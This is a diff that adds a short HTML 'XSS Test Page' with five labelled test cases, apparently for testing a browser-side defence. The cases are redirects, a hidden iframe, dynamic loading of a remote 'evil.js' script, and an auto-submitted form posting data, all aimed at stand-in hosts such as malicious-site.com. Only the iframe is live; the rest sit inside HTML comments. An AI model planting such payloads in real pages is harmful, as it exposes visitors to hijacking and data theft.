@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>XSS Test Page</title>
+</head>
+
+<body>
+    <h1>XSS Test Page</h1>
+
+    <!-- Test 1: Direct redirect -->
+    <!-- <script>
+        window.location.href = "https://malicious-site.com";
+    </script> -->
+
+    <!-- Test 2: Delayed redirect -->
+    <!-- <script>
+        setTimeout(() => {
+            window.location.href = "https://evil-site.com";
+        }, 1000);
+    </script> -->
+
+    <!-- Test 3: Hidden iframe -->
+    <iframe style="display:none" src="https://malicious-site.com"></iframe>
+
+    <!-- Test 4: Dynamic script loading -->
+    <!-- <script>
+        const script = document.createElement('script');
+        script.src = "https://malicious-site.com/evil.js";
+        document.body.appendChild(script);
+    </script> -->
+
+    <!-- Test 5: Form submission -->
+    <!-- <form id="evilForm" action="https://malicious-site.com" method="POST">
+        <input type="hidden" name="data" value="evil">
+    </form>
+    <script>
+        document.getElementById('evilForm').submit();
+    </script> -->
+</body>
+
+</html>
